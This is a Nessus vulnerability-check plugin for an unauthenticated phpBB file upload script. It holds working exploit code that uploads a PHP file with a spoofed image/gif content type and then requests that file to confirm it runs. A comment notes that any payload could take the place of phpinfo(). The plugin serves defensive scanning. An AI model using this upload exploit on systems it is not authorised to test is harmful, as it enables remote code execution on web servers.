#
# (C) Tenable Network Security
#
# 

  desc["english"] = "
The installed version of phpBB on the remote host includes a file
upload script intended as a way for users to upload files that they
can then link to in their posts.  The script, however, does not
require authentication, makes only a limited check of upload file
types, and stores uploads in a known location.  As a result, an
attacker can upload arbitrary scripts to the remote host and execute
them with the permissions of the web server user.

Solution : Uninstall the file upload script from phpBB.

Risk factor : High";


if (description) {
  script_id(18007);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(13084);

  name["english"] = "phpBB File Upload Script Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for file upload script vulnerability in phpBB";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencie("phpbb_detect.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Let's try to upload a PHP script.
  fname = string(SCRIPT_NAME, ".php");

  boundary = "bound";
  req = string(
    "POST ",  dir, "/up.php HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
    # nb: we'll add the Content-Length header and post data later.
  );
  boundary = string("--", boundary);
  postdata = string(
    boundary, "\r\n",
    'Content-Disposition: form-data; name="userfile"; filename="', fname, '"', "\r\n",
    # nb: the script prevents "text/plain" so we'll lie.
    "Content-Type: image/gif\r\n",
    "\r\n",
    # nb: this is the actual exploit code; you could put pretty much
    #     anything you want here.
    "<? phpinfo() ?>\r\n",

    boundary, "--", "\r\n"
  );
  req = string(
    req,
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) exit(0);           # can't connect

  # Try to identify the uploaded file.
  #
  # nb: this should go into "uploads/" but we'll do a search to be sure.
  pat = string("<a href=([^>]+/)", fname, ">", fname, "</a>");
  matches = egrep(pattern:pat, string:res, icase:TRUE);
  foreach match (split(matches)) {
    match = chomp(match);
    upload = eregmatch(pattern:pat, string:match);
    if (upload == NULL) break;
    upload = string(dir, "/", upload[1], fname);
    break;
  }

  if (!isnull(upload)) {
    # Make sure the uploaded script can be run.
    req = http_get(item:upload, port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If we could run it, there's a problem.
    if (egrep(pattern:"PHP Version", string:res, icase:TRUE)) {
      desc = str_replace(
        string:desc["english"],
        find:"Solution :",
        replace:string(
          "**** Nessus has successfully exploited this vulnerability by uploading\n",
          "**** an image file with PHP code that reveals information about the\n",
          "**** PHP configuration on the remote host. The file is located under\n",
          "**** the web server's document directory as:\n",
          "****          ", upload, "\n",
          "**** You are strongly encouraged to delete this file as soon as\n",
          "**** possible as it can be run by anyone who accesses it remotely.\n",
          "\n",
          "Solution :"
        )
      );
      security_hole(port:port, data:desc);
      exit(0);
    }
  }
}

